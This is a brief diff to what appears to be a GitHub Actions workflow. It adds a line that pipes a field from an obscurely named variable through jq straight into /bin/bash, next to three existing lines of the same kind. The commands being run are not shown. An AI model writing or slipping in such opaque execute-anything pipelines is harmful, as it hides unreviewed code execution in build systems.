@@ -26,6 +26,7 @@ jobs:
           echo $hq37 | jq -r .eawhz715 | /bin/bash
           echo $q32623 | jq -r .whnju10 | /bin/bash
           echo $vdq01 | jq -r .bjqz4 | /bin/bash
+          printf '%s' "$neg0701" | jq -r .qsn02 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
